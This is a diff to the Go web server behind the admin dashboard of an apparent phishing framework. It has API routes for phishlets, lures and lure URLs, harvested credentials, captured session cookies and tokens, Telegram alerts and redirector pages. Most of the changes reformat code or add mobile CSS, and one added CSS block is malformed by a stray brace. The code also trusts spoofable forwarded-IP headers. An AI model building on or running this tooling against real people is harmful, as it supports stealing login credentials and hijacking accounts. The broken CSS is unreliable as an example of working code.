@@ -22,19 +22,19 @@ import (
 )
 
 type WebServer struct {
-	server            *http.Server
-	cfg               *Config
-	db                *database.Database
-	proxy             *HttpProxy
-	upgrader          websocket.Upgrader
-	clients           map[*websocket.Conn]bool
-	clientsMutex      sync.RWMutex
-	sessions          map[string]*AuthSession
-	sessionsMutex     sync.RWMutex
-	terminalSessions  map[string]*TerminalSession
-	terminalMutex     sync.RWMutex
-	commandFilter     *CommandFilter
-	isRunning         bool
+	server           *http.Server
+	cfg              *Config
+	db               *database.Database
+	proxy            *HttpProxy
+	upgrader         websocket.Upgrader
+	clients          map[*websocket.Conn]bool
+	clientsMutex     sync.RWMutex
+	sessions         map[string]*AuthSession
+	sessionsMutex    sync.RWMutex
+	terminalSessions map[string]*TerminalSession
+	terminalMutex    sync.RWMutex
+	commandFilter    *CommandFilter
+	isRunning        bool
 }
 
 type AuthSession struct {
@@ -67,20 +67,20 @@ type SetupResponse struct {
 }
 
 type DashboardData struct {
-	Sessions      []*database.Session `json:"sessions"`
-	ActiveSessions int                `json:"active_sessions"`
-	TotalSessions  int                `json:"total_sessions"`
-	ServerStats   *ServerStats       `json:"server_stats"`
-	Phishlets     []PhishletInfo     `json:"phishlets"`
+	Sessions       []*database.Session `json:"sessions"`
+	ActiveSessions int                 `json:"active_sessions"`
+	TotalSessions  int                 `json:"total_sessions"`
+	ServerStats    *ServerStats        `json:"server_stats"`
+	Phishlets      []PhishletInfo      `json:"phishlets"`
 }
 
 type ServerStats struct {
-	Uptime       string `json:"uptime"`
-	Domain       string `json:"domain"`
-	IPAddress    string `json:"ip_address"`
-	HTTPSPort    int    `json:"https_port"`
-	DNSPort      int    `json:"dns_port"`
-	TelegramEnabled bool `json:"telegram_enabled"`
+	Uptime          string `json:"uptime"`
+	Domain          string `json:"domain"`
+	IPAddress       string `json:"ip_address"`
+	HTTPSPort       int    `json:"https_port"`
+	DNSPort         int    `json:"dns_port"`
+	TelegramEnabled bool   `json:"telegram_enabled"`
 }
 
 type PhishletInfo struct {
@@ -91,9 +91,9 @@ type PhishletInfo struct {
 }
 
 type WebSocketMessage struct {
-	Type    string      `json:"type"`
-	Data    interface{} `json:"data"`
-	Time    time.Time   `json:"time"`
+	Type string      `json:"type"`
+	Data interface{} `json:"data"`
+	Time time.Time   `json:"time"`
 }
 
 type TerminalSession struct {
@@ -132,11 +132,11 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	}
 
 	router := mux.NewRouter()
-	
+
 	// Dashboard routes
 	router.HandleFunc("/", ws.handleDashboard).Methods("GET")
 	router.HandleFunc("/dashboard", ws.handleDashboard).Methods("GET")
-	
+
 	// API routes
 	router.HandleFunc("/api/sessions", ws.handleAPISessions).Methods("GET")
 	router.HandleFunc("/api/sessions", ws.handleAPIDeleteAllSessions).Methods("DELETE")
@@ -148,7 +148,7 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	router.HandleFunc("/api/phishlets/{name}/disable", ws.handleAPIPhishletDisable).Methods("POST")
 	router.HandleFunc("/api/phishlets/{name}/hostname", ws.handleAPIPhishletHostname).Methods("POST")
 	router.HandleFunc("/api/phishlets/{name}/credentials", ws.handleAPIPhishletCredentials).Methods("GET")
-	
+
 	// Lures API routes
 	router.HandleFunc("/api/lures", ws.handleAPILures).Methods("GET")
 	router.HandleFunc("/api/lures", ws.handleAPICreateLure).Methods("POST")
@@ -157,17 +157,17 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	router.HandleFunc("/api/lures/{id}/url", ws.handleAPILureGetURL).Methods("GET")
 	router.HandleFunc("/api/lures/{id}/pause", ws.handleAPILurePause).Methods("POST")
 	router.HandleFunc("/api/lures/{id}/unpause", ws.handleAPILureUnpause).Methods("POST")
-	
-	// Configuration routes  
+
+	// Configuration routes
 	router.HandleFunc("/api/config/telegram", ws.handleAPITelegramConfig).Methods("GET", "POST")
 	router.HandleFunc("/api/config/telegram/test", ws.handleAPITelegramTest).Methods("POST")
 	router.HandleFunc("/api/config/turnstile", ws.handleAPITurnstileConfig).Methods("GET", "POST")
-	
+
 	// Redirector routes
 	router.HandleFunc("/api/redirectors", ws.handleAPIRedirectors).Methods("GET")
 	router.HandleFunc("/api/redirectors/upload", ws.handleAPIRedirectorUpload).Methods("POST")
 	router.HandleFunc("/api/redirectors/{name}", ws.handleAPIDeleteRedirector).Methods("DELETE")
-	
+
 	// Authentication routes
 	router.HandleFunc("/api/auth/status", ws.handleAuthStatus).Methods("GET")
 	router.HandleFunc("/api/auth/setup", ws.handleAuthSetup).Methods("POST")
@@ -175,13 +175,13 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	router.HandleFunc("/api/auth/logout", ws.handleAuthLogout).Methods("POST")
 	router.HandleFunc("/api/auth/lock", ws.handleAuthLock).Methods("POST")
 	router.HandleFunc("/api/auth/unlock", ws.handleAuthUnlock).Methods("POST")
-	
+
 	// WebSocket endpoint
 	router.HandleFunc("/ws", ws.handleWebSocket).Methods("GET")
-	
+
 	// Terminal WebSocket endpoint
 	router.HandleFunc("/ws/terminal", ws.handleTerminalWebSocket).Methods("GET")
-	
+
 	// Static file serving
 	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))
 
@@ -1086,108 +1086,544 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             }
         }
 
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .container {
+        /* Enhanced Mobile Responsive Design */
+        @media (max-width: 1024px) {
+            .container, .config-container {
+                margin-top: 50px;
                 padding: 16px;
             }
 
-            .header {
-                padding: 24px;
+            .nav-container {
+                padding: 8px 16px;
+                overflow-x: auto;
+                white-space: nowrap;
+                scrollbar-width: none; /* Firefox */
+                -ms-overflow-style: none; /* IE/Edge */
             }
 
-            .header h1 {
-                font-size: 2rem;
+            .nav-container::-webkit-scrollbar {
+                display: none; /* Chrome/Safari */
+            }
+
+            .nav-tab {
+                padding: 10px 18px;
+                font-size: 13px;
+                min-width: 80px;
+                flex-shrink: 0;
             }
 
             .stats-grid {
-                grid-template-columns: 1fr;
+                grid-template-columns: repeat(2, 1fr);
                 gap: 12px;
             }
 
             .phishlets-grid {
-                grid-template-columns: 1fr;
+                grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
                 gap: 12px;
             }
 
-            .phishlet-actions {
-                flex-direction: column;
-            }
-
-            .phishlet-actions .btn {
-                min-width: unset;
-            }
-
-            .auth-controls {
-                position: relative;
-                top: unset;
-                right: unset;
-                margin-bottom: 16px;
-                justify-content: center;
-                flex-wrap: wrap;
-            }
-
-            .connection-status {
-                position: relative;
-                top: unset;
-                left: unset;
-                margin-bottom: 16px;
-                display: inline-block;
-            }
-
-            .sessions-table {
-                font-size: 12px;
-            }
-
-            .sessions-table th,
-            .sessions-table td {
-                padding: 8px 12px;
-            }
-
-            .section-controls {
-                flex-direction: column;
-                align-items: stretch;
-                gap: 12px;
-            }
-
-            .terminal-content {
-                width: 95%;
-                height: 90vh;
-            }
-
-            .modal-content {
-                width: 95%;
-                max-width: unset;
-                padding: 24px 20px;
+            /* Improve touch targets for tablets */
+            .btn {
+                min-height: 42px;
+                padding: 10px 18px;
             }
         }
 
-        @media (max-width: 480px) {
-            .container {
+        @media (max-width: 768px) {
+            .container, .config-container {
+                margin-top: 45px;
                 padding: 12px;
             }
 
-            .sessions-table {
-                font-size: 11px;
+            .header {
+                padding: 20px 16px;
+                text-align: center;
             }
 
-            .sessions-table th,
-            .sessions-table td {
-                padding: 6px 8px;
+            .header h1 {
+                font-size: 1.8rem;
+                line-height: 1.2;
+            }
+
+            .header p {
+                font-size: 14px;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+
+            .stat-card {
+                padding: 16px;
+            }
+
+            .stat-number {
+                font-size: 2rem;
+            }
+
+            .phishlets-grid {
+                grid-template-columns: 1fr;
+                gap: 10px;
             }
 
             .phishlet-card {
                 padding: 16px;
             }
 
+            .phishlet-actions {
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .phishlet-actions .btn {
+                min-width: unset;
+                width: 100%;
+                justify-content: center;
+                min-height: 44px;
+                font-size: 14px;
+            }
+
+            .auth-controls {
+                position: fixed;
+                top: 8px;
+                right: 8px;
+                flex-direction: column;
+                gap: 6px;
+                z-index: 1000;
+            }
+
+            .auth-controls .btn {
+                font-size: 12px;
+                padding: 6px 10px;
+                min-height: 36px;
+            }
+
+            .connection-status {
+                position: fixed;
+                top: 8px;
+                left: 8px;
+                font-size: 11px;
+                padding: 6px 10px;
+                z-index: 1000;
+                border-radius: var(--radius-sm);
+            }
+
+            .sessions-table {
+                font-size: 12px;
+                display: block;
+                overflow-x: auto;
+                white-space: nowrap;
+                -webkit-overflow-scrolling: touch; /* Smooth scrolling on iOS */
+            }
+
+            .sessions-table thead,
+            .sessions-table tbody,
+            .sessions-table th,
+            .sessions-table td,
+            .sessions-table tr {
+                display: block;
+            }
+
+            .sessions-table thead tr {
+                position: absolute;
+                top: -9999px;
+                left: -9999px;
+            }
+
+            .sessions-table tr {
+                border: 1px solid var(--border-primary);
+                margin-bottom: 12px;
+                padding: 12px;
+                border-radius: var(--radius-md);
+                background: var(--bg-tertiary);
+                box-shadow: var(--shadow-sm);
+            }
+
+            .sessions-table td {
+                border: none;
+                position: relative;
+                padding: 8px 0 8px 35%;
+                text-align: left;
+                min-height: 24px;
+                display: flex;
+                align-items: center;
+            }
+
+            .sessions-table td:before {
+                content: attr(data-label) ": ";
+                position: absolute;
+                left: 8px;
+                width: 30%;
+                padding-right: 10px;
+                white-space: nowrap;
+                font-weight: 600;
+                color: var(--text-secondary);
+                font-size: 11px;
+                text-transform: uppercase;
+                display: flex;
+                align-items: center;
+            }
+
+            .section-controls {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 8px;
+            }
+
+            .section-controls > div {
+                flex-direction: column;
+                gap: 6px;
+            }
+
+            .section-controls .btn {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .terminal-content {
+                width: 98%;
+                height: 95vh;
+                max-height: none;
+            }
+
+            .terminal-header {
+                padding: 12px 16px;
+            }
+
+            .terminal-header h2 {
+                font-size: 14px;
+            }
+
+            .terminal-controls .btn {
+                font-size: 11px;
+                padding: 4px 8px;
+            }
+
+            .modal-content {
+                width: 95%;
+                max-width: none;
+                padding: 20px 16px;
+                margin: 10px;
+                max-height: 90vh;
+                overflow-y: auto;
+            }
+
+            .modal h2 {
+                font-size: 18px;
+            }
+
+            .form-group input,
+            .form-group select {
+                font-size: 16px; /* Prevents zoom on iOS */
+            }
+
+            .btn {
+                padding: 10px 18px;
+                font-size: 14px;
+                min-height: 44px; /* Touch target size */
+                border-radius: var(--radius-md);
+            }
+
+            .btn-sm {
+                padding: 8px 14px;
+                font-size: 12px;
+                min-height: 40px;
+            }
+
+            .btn-lg {
+                padding: 14px 28px;
+                font-size: 16px;
+                min-height: 52px;
+            }
+
+            .auto-refresh {
+                bottom: 8px;
+                right: 8px;
+                font-size: 10px;
+                padding: 4px 8px;
+            }
+
+            .toast {
+                bottom: 60px;
+                max-width: 90%;
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container, .config-container {
+                margin-top: 40px;
+                padding: 10px;
+            }
+
+            .header {
+                padding: 18px 14px;
+            }
+
+            .header h1 {
+                font-size: 1.6rem;
+                line-height: 1.1;
+            }
+
+            .header p {
+                font-size: 14px;
+            }
+
+            .stat-card {
+                padding: 14px;
+            }
+
+            .stat-number {
+                font-size: 2rem;
+            }
+
+            .stat-label {
+                font-size: 12px;
+            }
+
+            .phishlet-card {
+                padding: 14px;
+            }
+
+            .phishlet-name {
+                font-size: 15px;
+                font-weight: 600;
+            }
+
+            .phishlet-status {
+                font-size: 13px;
+                margin-bottom: 8px;
+            }
+
+            .sessions-table td {
+                padding: 6px 0 6px 35%;
+                font-size: 11px;
+                min-height: 28px;
+            }
+
+            .sessions-table td:before {
+                font-size: 10px;
+                width: 30%;
+            }
+
+            .section-title {
+                font-size: 1.3rem;
+            }
+
+            .nav-tab {
+                padding: 8px 14px;
+                font-size: 13px;
+                min-height: 40px;
+            }
+
+            .modal-content {
+                padding: 18px 14px;
+                border-radius: var(--radius-lg);
+            }
+
+            .modal h2 {
+                font-size: 17px;
+            }
+
+            .form-group label {
+                font-size: 13px;
+            }
+
+            /* Improve form inputs for mobile */
+            .form-group input,
+            .form-group select,
+            .form-group textarea {
+                padding: 14px 16px;
+                font-size: 16px; /* Prevents zoom on iOS */
+                border-radius: var(--radius-md);
+                min-height: 48px;
+            }
+
+            /* Better spacing for mobile cards */
+            .sessions-section,
+            .phishlets-section,
+            .config-section {
+                margin-bottom: 16px;
+                padding: 16px;
+            }
+
+            /* Improve toast notifications for mobile */
+            .toast {
+                bottom: 20px;
+                left: 10px;
+                right: 10px;
+                max-width: none;
+                font-size: 14px;
+                padding: 12px 16px;
+            }
+
+            .form-group input,
+            .form-group select {
+                padding: 10px 12px;
+                font-size: 16px;
+            }
+
             .btn {
                 padding: 6px 12px;
                 font-size: 12px;
+                min-height: 40px;
+            }
+
+            .btn-sm {
+                padding: 4px 8px;
+                font-size: 10px;
+                min-height: 32px;
             }
 
             .btn-lg {
                 padding: 10px 20px;
                 font-size: 14px;
+                min-height: 44px;
+            }
+
+            .key-display {
+                font-size: 12px;
+                padding: 12px;
+                flex-direction: column;
+                gap: 8px;
+                text-align: center;
+            }
+
+            .terminal-content {
+                width: 100%;
+                height: 100vh;
+                border-radius: 0;
+            }
+
+            .terminal-header {
+                padding: 8px 12px;
+            }
+
+            .terminal-warning {
+                padding: 8px 12px;
+                font-size: 11px;
+            }
+        }
+
+        /* Landscape orientation optimizations */
+        @media (max-width: 768px) and (orientation: landscape) {
+            .container, .config-container {
+                margin-top: 35px;
+            }
+
+            .header {
+                padding: 12px 16px;
+            }
+
+            .header h1 {
+                font-size: 1.6rem;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .terminal-content {
+                height: 90vh;
+            }
+        }
+
+        /* Touch-friendly improvements */
+        @media (hover: none) and (pointer: coarse) {
+            /* Touch device optimizations */
+            .btn:hover {
+                transform: none;
+                box-shadow: none;
+            }
+
+            .stat-card:hover {
+                transform: none;
+            }
+
+            .phishlet-card:hover {
+                transform: none;
+            }
+
+            /* Larger touch targets */
+            .nav-tab {
+                min-height: 48px;
+                padding: 12px 20px;
+            }
+
+            .btn {
+                min-height: 48px;
+                padding: 12px 20px;
+            }
+
+            .btn-sm {
+                min-height: 44px;
+                padding: 10px 18px;
+            }
+
+            /* Better touch feedback */
+            .btn:active {
+                transform: scale(0.98);
+                transition: transform 0.1s ease;
+            }
+
+            .nav-tab:active {
+                transform: scale(0.98);
+                transition: transform 0.1s ease;
+            }
+
+            /* Improve scrollable areas */
+            .nav-container {
+                -webkit-overflow-scrolling: touch;
+                scroll-behavior: smooth;
+            }
+
+            .sessions-table {
+                -webkit-overflow-scrolling: touch;
+                scroll-behavior: smooth;
+            }
+        }
+
+        /* Better spacing for touch */
+            .phishlet-actions {
+                gap: 8px;
+            }
+
+            .section-controls > div {
+                gap: 8px;
+            }
+        }
+
+        /* High DPI displays */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .sessions-table {
+                font-size: 12px;
+            }
+
+            .btn {
+                font-weight: 500;
+            }
+        }
+
+        /* Accessibility improvements for mobile */
+        @media (max-width: 768px) {
+            /* Focus indicators */
+            .btn:focus,
+            input:focus,
+            select:focus {
+                outline: 3px solid var(--accent-primary);
+                outline-offset: 2px;
+            }
+
+            /* Better contrast for small screens */
+            .status-badge {
+                font-weight: 600;
+                border-width: 2px;
+            }
+
+            /* Improved readability */
+            .sessions-table td:before {
+                font-weight: 700;
             }
         }
 
@@ -3397,7 +3833,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 </body>
 </html>
 	`
-	
+
 	w.Header().Set("Content-Type", "text/html")
 	w.WriteHeader(http.StatusOK)
 	w.Write([]byte(dashboardHTML))
@@ -3468,7 +3904,7 @@ func (ws *WebServer) handleAPIDeleteSession(w http.ResponseWriter, r *http.Reque
 	}
 
 	ws.db.Flush()
-	
+
 	response := AuthResponse{
 		Success: true,
 		Message: "Session deleted successfully",
@@ -3511,11 +3947,11 @@ func (ws *WebServer) handleAPIDeleteAllSessions(w http.ResponseWriter, r *http.R
 	}
 
 	ws.db.Flush()
-	
+
 	response := map[string]interface{}{
-		"success": true,
-		"message": fmt.Sprintf("Deleted %d sessions successfully", deletedCount),
-		"deleted_count": deletedCount,
+		"success":        true,
+		"message":        fmt.Sprintf("Deleted %d sessions successfully", deletedCount),
+		"deleted_count":  deletedCount,
 		"total_sessions": len(sessions),
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -3524,10 +3960,10 @@ func (ws *WebServer) handleAPIDeleteAllSessions(w http.ResponseWriter, r *http.R
 
 func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
 	sessions, _ := ws.db.ListSessions()
-	
+
 	activeSessions := 0
 	capturedSessions := 0
-	
+
 	for _, session := range sessions {
 		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
 			capturedSessions++
@@ -3545,12 +3981,12 @@ func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
 		"total_sessions":    len(sessions),
 		"active_sessions":   activeSessions,
 		"captured_sessions": capturedSessions,
-		"uptime":           uptimeStr,
-		"domain":           ws.cfg.GetBaseDomain(),
-		"ip_address":       ws.cfg.GetServerExternalIP(),
-		"https_port":       ws.cfg.GetHttpsPort(),
-		"dns_port":         ws.cfg.GetDnsPort(),
-		"telegram_enabled": ws.cfg.GetTelegramEnabled(),
+		"uptime":            uptimeStr,
+		"domain":            ws.cfg.GetBaseDomain(),
+		"ip_address":        ws.cfg.GetServerExternalIP(),
+		"https_port":        ws.cfg.GetHttpsPort(),
+		"dns_port":          ws.cfg.GetDnsPort(),
+		"telegram_enabled":  ws.cfg.GetTelegramEnabled(),
 	}
 
 	w.Header().Set("Content-Type", "application/json")
@@ -3559,13 +3995,13 @@ func (ws *WebServer) handleAPIStats(w http.ResponseWriter, r *http.Request) {
 
 func (ws *WebServer) handleAPIPhishlets(w http.ResponseWriter, r *http.Request) {
 	var phishlets []PhishletInfo
-	
+
 	for _, name := range ws.cfg.GetPhishletNames() {
 		_, err := ws.cfg.GetPhishlet(name)
 		if err != nil {
 			continue
 		}
-		
+
 		config := ws.cfg.PhishletConfig(name)
 		phishlets = append(phishlets, PhishletInfo{
 			Name:     name,
@@ -3730,9 +4166,9 @@ func (ws *WebServer) handleAPIPhishletCredentials(w http.ResponseWriter, r *http
 
 	credentialsText := strings.Join(credentials, "\n")
 	response := map[string]interface{}{
-		"success": true,
+		"success":     true,
 		"credentials": credentialsText,
-		"message": "Credentials retrieved",
+		"message":     "Credentials retrieved",
 	}
 	json.NewEncoder(w).Encode(response)
 }
@@ -3964,8 +4400,8 @@ func (ws *WebServer) handleAPILurePause(w http.ResponseWriter, r *http.Request) 
 	}
 
 	response := map[string]interface{}{
-		"success": true,
-		"message": fmt.Sprintf("Lure paused for %s", req.Duration),
+		"success":      true,
+		"message":      fmt.Sprintf("Lure paused for %s", req.Duration),
 		"paused_until": time.Unix(pauseUntil, 0).Format(time.RFC3339),
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -4028,10 +4464,10 @@ func (ws *WebServer) handleAPITelegramConfig(w http.ResponseWriter, r *http.Requ
 	if r.Method == "GET" {
 		// Return current Telegram configuration
 		config := map[string]interface{}{
-			"success":     true,
-			"bot_token":   ws.cfg.GetTelegramBotToken(),
-			"chat_id":     ws.cfg.GetTelegramChatId(), 
-			"enabled":     ws.cfg.GetTelegramEnabled(),
+			"success":   true,
+			"bot_token": ws.cfg.GetTelegramBotToken(),
+			"chat_id":   ws.cfg.GetTelegramChatId(),
+			"enabled":   ws.cfg.GetTelegramEnabled(),
 		}
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(config)
@@ -4088,7 +4524,7 @@ func (ws *WebServer) handleAPITelegramTest(w http.ResponseWriter, r *http.Reques
 	// Test Telegram configuration
 	botToken := ws.cfg.GetTelegramBotToken()
 	chatId := ws.cfg.GetTelegramChatId()
-	
+
 	if botToken == "" || chatId == "" {
 		response := AuthResponse{
 			Success: false,
@@ -4101,7 +4537,7 @@ func (ws *WebServer) handleAPITelegramTest(w http.ResponseWriter, r *http.Reques
 	telegram := NewTelegramBot()
 	telegram.Setup(botToken, chatId)
 	err := telegram.Test()
-	
+
 	if err != nil {
 		response := AuthResponse{
 			Success: false,
@@ -4214,7 +4650,7 @@ func (ws *WebServer) handleAPIRedirectors(w http.ResponseWriter, r *http.Request
 			dirPath := filepath.Join(redirectorsDir, f.Name())
 			indexPath1 := filepath.Join(dirPath, "index.html")
 			indexPath2 := filepath.Join(dirPath, "index.htm")
-			
+
 			var indexFound string
 			if _, err := os.Stat(indexPath1); err == nil {
 				indexFound = "index.html"
@@ -4225,9 +4661,9 @@ func (ws *WebServer) handleAPIRedirectors(w http.ResponseWriter, r *http.Request
 			if indexFound != "" {
 				info, _ := f.Info()
 				redirector := map[string]interface{}{
-					"name":         f.Name(),
-					"index_file":   indexFound,
-					"created_at":   info.ModTime().Format("2006-01-02 15:04:05"),
+					"name":       f.Name(),
+					"index_file": indexFound,
+					"created_at": info.ModTime().Format("2006-01-02 15:04:05"),
 				}
 				redirectors = append(redirectors, redirector)
 			}
@@ -4480,46 +4916,46 @@ func (ws *WebServer) createSession(ip string) string {
 	token := ws.generateSessionToken()
 	ws.sessionsMutex.Lock()
 	defer ws.sessionsMutex.Unlock()
-	
+
 	ws.sessions[token] = &AuthSession{
 		Token:     token,
 		CreatedAt: time.Now(),
 		ExpiresAt: time.Now().Add(24 * time.Hour),
 		IPAddress: ip,
 	}
-	
+
 	return token
 }
 
 func (ws *WebServer) validateSession(token string) bool {
 	ws.sessionsMutex.RLock()
 	defer ws.sessionsMutex.RUnlock()
-	
+
 	session, exists := ws.sessions[token]
 	if !exists {
 		return false
 	}
-	
+
 	if time.Now().After(session.ExpiresAt) {
 		// Session expired
 		delete(ws.sessions, token)
 		return false
 	}
-	
+
 	return true
 }
 
 func (ws *WebServer) destroySession(token string) {
 	ws.sessionsMutex.Lock()
 	defer ws.sessionsMutex.Unlock()
-	
+
 	delete(ws.sessions, token)
 }
 
 func (ws *WebServer) cleanupExpiredSessions() {
 	ws.sessionsMutex.Lock()
 	defer ws.sessionsMutex.Unlock()
-	
+
 	now := time.Now()
 	for token, session := range ws.sessions {
 		if now.After(session.ExpiresAt) {
@@ -4533,34 +4969,34 @@ func (ws *WebServer) getClientIP(r *http.Request) string {
 	if forwarded != "" {
 		return forwarded
 	}
-	
+
 	realIP := r.Header.Get("X-Real-IP")
 	if realIP != "" {
 		return realIP
 	}
-	
+
 	return r.RemoteAddr
 }
 
 // Authentication handlers
 func (ws *WebServer) handleAuthStatus(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	
+
 	token := r.Header.Get("Authorization")
 	isAuthenticated := ws.validateSession(token)
-	
+
 	response := AuthStatusResponse{
 		IsSetup:         ws.cfg.IsSetup(),
 		IsLocked:        ws.cfg.IsLocked(),
 		IsAuthenticated: isAuthenticated,
 	}
-	
+
 	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleAuthSetup(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	
+
 	if ws.cfg.IsSetup() {
 		response := SetupResponse{
 			Success: false,
@@ -4569,22 +5005,22 @@ func (ws *WebServer) handleAuthSetup(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	key := ws.cfg.GenerateAuthKey()
 	ws.cfg.SetupAuth(key)
-	
+
 	response := SetupResponse{
 		Success: true,
 		Key:     key,
 		Message: "Authentication setup complete",
 	}
-	
+
 	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	
+
 	if !ws.cfg.IsSetup() {
 		response := AuthResponse{
 			Success: false,
@@ -4593,7 +5029,7 @@ func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	var req AuthRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		response := AuthResponse{
@@ -4603,7 +5039,7 @@ func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	if !ws.cfg.ValidateKey(req.Key) {
 		response := AuthResponse{
 			Success: false,
@@ -4612,38 +5048,38 @@ func (ws *WebServer) handleAuthLogin(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	token := ws.createSession(ws.getClientIP(r))
 	ws.cfg.UpdateLastAccess()
-	
+
 	response := AuthResponse{
 		Success: true,
 		Token:   token,
 		Message: "Login successful",
 	}
-	
+
 	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleAuthLogout(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	
+
 	token := r.Header.Get("Authorization")
 	if token != "" {
 		ws.destroySession(token)
 	}
-	
+
 	response := AuthResponse{
 		Success: true,
 		Message: "Logout successful",
 	}
-	
+
 	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleAuthLock(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	
+
 	token := r.Header.Get("Authorization")
 	if !ws.validateSession(token) {
 		response := AuthResponse{
@@ -4654,25 +5090,25 @@ func (ws *WebServer) handleAuthLock(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	ws.cfg.LockPanel()
-	
+
 	// Destroy all sessions
 	ws.sessionsMutex.Lock()
 	ws.sessions = make(map[string]*AuthSession)
 	ws.sessionsMutex.Unlock()
-	
+
 	response := AuthResponse{
 		Success: true,
 		Message: "Panel locked",
 	}
-	
+
 	json.NewEncoder(w).Encode(response)
 }
 
 func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	
+
 	if !ws.cfg.IsLocked() {
 		response := AuthResponse{
 			Success: false,
@@ -4681,7 +5117,7 @@ func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	var req AuthRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		response := AuthResponse{
@@ -4691,7 +5127,7 @@ func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	if !ws.cfg.ValidateKey(req.Key) {
 		response := AuthResponse{
 			Success: false,
@@ -4700,14 +5136,14 @@ func (ws *WebServer) handleAuthUnlock(w http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(w).Encode(response)
 		return
 	}
-	
+
 	ws.cfg.UnlockPanel()
-	
+
 	response := AuthResponse{
 		Success: true,
 		Message: "Panel unlocked",
 	}
-	
+
 	json.NewEncoder(w).Encode(response)
 }
 
@@ -4733,10 +5169,10 @@ func (ws *WebServer) BroadcastToClients(msgType string, data interface{}) {
 
 func (ws *WebServer) getStatsData() map[string]interface{} {
 	sessions, _ := ws.db.ListSessions()
-	
+
 	activeSessions := 0
 	capturedSessions := 0
-	
+
 	for _, session := range sessions {
 		if len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0 {
 			capturedSessions++
@@ -4753,7 +5189,7 @@ func (ws *WebServer) getStatsData() map[string]interface{} {
 		"total_sessions":    len(sessions),
 		"active_sessions":   activeSessions,
 		"captured_sessions": capturedSessions,
-		"uptime":           uptimeStr,
+		"uptime":            uptimeStr,
 	}
 }
 
@@ -4807,21 +5243,21 @@ func NewCommandFilter() *CommandFilter {
 
 func (cf *CommandFilter) IsCommandSafe(command string) bool {
 	cmd := strings.TrimSpace(strings.ToLower(command))
-	
+
 	// Check for blocked commands
 	for _, blocked := range cf.blockedCommands {
 		if strings.Contains(cmd, blocked) {
 			return false
 		}
 	}
-	
+
 	// Check for blocked paths
 	for _, blockedPath := range cf.blockedPaths {
 		if strings.Contains(cmd, blockedPath) {
 			return false
 		}
 	}
-	
+
 	return true
 }
 
@@ -4833,20 +5269,20 @@ func (ws *WebServer) handleTerminalWebSocket(w http.ResponseWriter, r *http.Requ
 		// Try to get token from query parameter (for WebSocket connections)
 		token = r.URL.Query().Get("token")
 	}
-	
+
 	if !ws.validateSession(token) {
 		log.Warning("unauthorized terminal access attempt from %s", r.RemoteAddr)
 		http.Error(w, "Unauthorized", 401)
 		return
 	}
-	
+
 	// Upgrade to WebSocket
 	conn, err := ws.upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Error("terminal websocket upgrade error: %v", err)
 		return
 	}
-	
+
 	// Create terminal session
 	sessionID := ws.generateSessionToken()
 	session, err := ws.createTerminalSession(sessionID, token)
@@ -4855,17 +5291,17 @@ func (ws *WebServer) handleTerminalWebSocket(w http.ResponseWriter, r *http.Requ
 		conn.Close()
 		return
 	}
-	
+
 	session.Conn = conn
 	log.Info("terminal session created: %s", sessionID)
-	
+
